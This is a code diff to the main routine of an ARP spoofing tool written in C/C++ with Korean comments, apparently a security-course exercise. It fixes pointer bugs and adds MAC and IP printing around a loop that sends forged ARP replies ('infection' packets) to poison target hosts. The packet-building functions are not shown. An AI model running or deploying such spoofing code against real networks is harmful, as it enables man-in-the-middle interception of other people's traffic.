@@ -19,12 +19,17 @@ int main(int argc, char* argv[]) {
     printf("Device %s opened successfully.\n", dev);
 
     // 3. 내 mac 주소와 ip 주소 얻어내기
-    uint8_t* my_mac = getMyMac(dev);
-    if (my_mac == nullptr) {
+    uint8_t my_mac[6];
+    if (!getMyMac(dev, my_mac)) {
         fprintf(stderr, "Failed to get MAC address for %s\n", dev);
         return -1;
     }
-    uint32_t my_ip;
+    printf("\n");
+    print_mac(my_mac);
+    printf("\n");
+    uint32_t my_ip = getMyIp(dev);
+    print_ip(my_ip);
+    printf("\n");
 
     // 3. 반복문으로 모든 IP 쌍에 대해 공격 수행
     for (int i = 2; i < argc; i += 2) {
@@ -37,8 +42,11 @@ int main(int argc, char* argv[]) {
         // 1. Sender IP의 MAC 주소를 얻기 위해 ARP Request를 보냄
         request_sender_mac(pcap, my_mac, my_ip, sender_ip);
         // 2. 응답으로 Target의 MAC 주소를 알아냄
-        uint8_t* sender_mac;
-        analysis_sender_mac(pcap, sender_ip, target_ip, sender_mac);
+        uint8_t sender_mac[6];
+        if (!analysis_sender_mac(pcap, sender_ip, target_ip, sender_mac)) {
+            printf("Failed to get sender's MAC address.\n");
+            continue;
+        }
         // 3. 위조된 ARP Reply (Infection) 패킷을 Target에게 전송
         send_arp_attack(pcap, sender_mac, sender_ip, target_ip, my_mac);
     }
